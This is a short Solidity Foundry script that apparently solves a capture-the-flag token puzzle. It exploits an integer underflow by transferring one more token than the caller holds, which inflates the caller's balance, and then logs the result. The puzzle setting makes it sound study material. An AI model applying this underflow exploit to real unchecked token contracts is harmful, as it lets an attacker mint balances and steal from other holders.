// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import { Script, console } from "forge-std/Script.sol";
import { Token } from "../../src/puzzles/5/Token.sol";

contract TokenSolution is Script {
    function run(address target) public {
        Token puzzleContract = Token(target);
        uint256 balance = puzzleContract.balanceOf(msg.sender);
        uint256 overflowValue = balance + 1;

        vm.startBroadcast();
        puzzleContract.transfer(target, overflowValue);
        vm.stopBroadcast();

        console.log("Player address: ");
        console.logAddress(msg.sender);
        console.log("Balance of player: ", puzzleContract.balanceOf(msg.sender));
    }
}